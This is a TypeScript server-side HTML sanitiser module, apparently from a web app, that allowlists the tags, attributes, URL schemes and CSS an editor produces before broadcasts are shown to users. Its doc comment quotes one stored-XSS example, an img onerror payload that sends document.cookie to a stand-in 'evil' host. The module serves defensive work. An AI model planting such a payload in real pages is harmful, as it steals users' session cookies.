import "server-only";

import sanitizeHtml from "sanitize-html";

/**
 * Server-side HTML sanitiser for user-authored rich content (broadcasts, and
 * defence-in-depth for rich letters). The composer is a TipTap editor, but the
 * stored HTML must never be TRUSTED — a caller can POST arbitrary `bodyHtml`
 * straight to the action. Broadcast bodies are rendered with
 * `dangerouslySetInnerHTML` into EVERY recipient's browser (including the
 * critical login lock-gate), so an unsanitised body is a stored-XSS vector
 * (e.g. `<img src=x onerror="fetch('//evil/?'+document.cookie)">` executing in a
 * super-admin's session).
 *
 * Strategy: strict ALLOWLIST that mirrors what the editor can legitimately
 * produce — headings, paragraphs, lists, tables, inline formatting, safe links
 * and images — while `sanitize-html` drops everything else: `<script>`, every
 * `on*` event-handler attribute, `<iframe>/<object>/<embed>`, `javascript:` URLs,
 * and any tag/attr not listed.
 */
const OPTIONS: sanitizeHtml.IOptions = {
  allowedTags: [
    "p", "br", "span", "div", "h1", "h2", "h3", "h4", "h5", "h6",
    "strong", "b", "em", "i", "u", "s", "strike", "sub", "sup",
    "blockquote", "ul", "ol", "li", "a", "img", "hr", "code", "pre",
    "table", "thead", "tbody", "tfoot", "tr", "td", "th", "caption", "colgroup", "col",
  ],
  allowedAttributes: {
    a: ["href", "name", "target", "rel"],
    img: ["src", "alt", "title", "width", "height", "style", "class", "data-path"],
    span: ["style", "class", "data-field-id"],
    div: ["style", "class"],
    p: ["style", "class"],
    td: ["style", "class", "colspan", "rowspan"],
    th: ["style", "class", "colspan", "rowspan"],
    table: ["style", "class"],
    col: ["span", "style"],
    "*": ["style", "class"],
  },
  // href only via safe schemes (NO javascript:); img via http/https/data only.
  allowedSchemes: ["http", "https", "mailto", "tel"],
  allowedSchemesByTag: { img: ["http", "https", "data"] },
  allowProtocolRelative: false,
  // Restrict inline CSS to presentational properties the editor emits — never
  // `background`/`background-image` (url()-based exfil) or `position`.
  allowedStyles: {
    "*": {
      color: [/.*/],
      "background-color": [/.*/],
      "font-size": [/.*/],
      "font-family": [/.*/],
      "font-weight": [/.*/],
      "font-style": [/.*/],
      "text-align": [/.*/],
      "text-decoration": [/.*/],
      "line-height": [/.*/],
      "margin-left": [/.*/],
      "padding-left": [/.*/],
      "white-space": [/.*/],
      "border-bottom": [/.*/],
      "border-radius": [/.*/],
    },
  },
  // Force every link to be safe to click and open (no reverse-tabnabbing).
  transformTags: {
    a: sanitizeHtml.simpleTransform("a", { rel: "noopener noreferrer nofollow" }, true),
  },
};

/** Sanitise user-authored rich HTML. Returns "" for null/undefined input. */
export function sanitizeRichHtml(html: string | null | undefined): string {
  if (!html) return "";
  return sanitizeHtml(html, OPTIONS);
}
